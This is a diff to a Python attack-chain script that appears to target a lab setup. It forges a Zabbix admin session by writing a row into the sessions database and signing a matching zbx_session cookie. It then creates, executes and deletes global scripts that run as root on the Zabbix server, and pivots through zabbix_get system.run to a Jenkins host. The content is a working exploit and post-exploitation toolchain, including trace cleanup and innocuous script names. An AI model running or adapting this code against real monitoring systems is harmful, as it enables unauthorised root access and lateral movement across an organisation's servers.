@@ -198,33 +198,51 @@ def step6():
 
     # 6b: forge an admin session row, then a matching signed cookie
     sid = secrets.token_hex(16)
-    sql(f"INSERT INTO sessions (sessionid,userid,lastaccess,status,secret) "
-        f"VALUES ('{sid}',1,UNIX_TIMESTAMP(),0,'')")
+    sql(f"INSERT INTO sessions (sessionid,userid,lastaccess,status) "
+        f"VALUES ('{sid}',1,UNIX_TIMESTAMP(),0)")
     signed = json.dumps({"sessionid": sid}, separators=(",", ":"))
     sign = hmac.new(key.encode(), signed.encode(), hashlib.sha256).hexdigest()
     cookie = base64.b64encode(json.dumps({"sessionid": sid, "sign": sign},
                                          separators=(",", ":")).encode()).decode()
-    out = http(f"http://{H}:8084/api_jsonrpc.php",
-               data=json.dumps({"jsonrpc": "2.0", "method": "script.create",
-                                "params": {"command": "id; hostname"}, "id": 1}).encode(),
-               headers={"Cookie": f"zbx_session={cookie}", "Content-Type": "application/json"})
-    res = json.loads(out).get("result", {}).get("output", "")
-    (ok(f"Zabbix script.create as root: {res.strip().splitlines()[0]}")
-     if "uid=0" in res else bad(f"Zabbix RCE failed: {out[:120]}"))
-    ZBX_COOKIE["c"] = cookie
+    page = http(f"http://{H}:8084/zabbix.php?action=dashboard.view",
+                headers={"Cookie": f"zbx_session={cookie}"})
+    (ok("forged zbx_session accepted by the real Zabbix frontend (Admin)")
+     if "Sign out" in page or "action=userprofile" in page
+     else bad("forged cookie rejected by Zabbix frontend"))
+    ZBX["sid"] = sid
+    res = _zabbix_root("id; hostname")
+    (ok(f"global script on Zabbix server runs as root: {res.strip().splitlines()[0]}")
+     if "uid=0" in res else bad(f"Zabbix script failed: {res[:160]}"))
 
 
 # ------------------------------------------------------------------ steps 7-10
-ZBX_COOKIE = {}
+ZBX = {}
+
+
+def _zrpc(method, params):
+    out = http(f"http://{H}:8084/api_jsonrpc.php",
+               data=json.dumps({"jsonrpc": "2.0", "method": method, "params": params,
+                                "auth": ZBX["sid"], "id": 1}).encode(),
+               headers={"Content-Type": "application/json-rpc"})
+    r = json.loads(out)
+    if "error" in r:
+        raise RuntimeError(f"{method}: {r['error'].get('data')}")
+    return r["result"]
 
 
 def _zabbix_root(cmd):
-    out = http(f"http://{H}:8084/api_jsonrpc.php",
-               data=json.dumps({"jsonrpc": "2.0", "method": "script.create",
-                                "params": {"command": cmd}, "id": 1}).encode(),
-               headers={"Cookie": f"zbx_session={ZBX_COOKIE['c']}",
-                        "Content-Type": "application/json"})
-    return json.loads(out).get("result", {}).get("output", "")
+    """Admin global script, executed on the Zabbix server (AllowRoot=1)."""
+    if "hostid" not in ZBX:
+        ZBX["hostid"] = _zrpc("host.get", {"filter": {"host": ["Zabbix server"]},
+                                           "output": ["hostid"]})[0]["hostid"]
+    name = "diag-" + secrets.token_hex(3)
+    scriptid = _zrpc("script.create", {"name": name, "command": cmd, "type": 0,
+                                       "scope": 2, "execute_on": 1})["scriptids"][0]
+    try:
+        return _zrpc("script.execute", {"scriptid": scriptid,
+                                        "hostid": ZBX["hostid"]}).get("value", "")
+    finally:
+        _zrpc("script.delete", [scriptid])
 
 
 def step7():
@@ -233,7 +251,7 @@ def step7():
                             capture_output=True, timeout=30).stdout
     ok("Jenkins agent drops non-zabbix peers") if b"uid=" not in direct \
         else bad("Jenkins agent answered a non-Server peer")
-    if "c" not in ZBX_COOKIE:
+    if "sid" not in ZBX:
         return bad("no Zabbix session (step 6 failed)")
     zg = "zabbix_get -s jenkins.atbmarket.com -k "
     idout = _zabbix_root(zg + "'system.run[id; hostname]'")
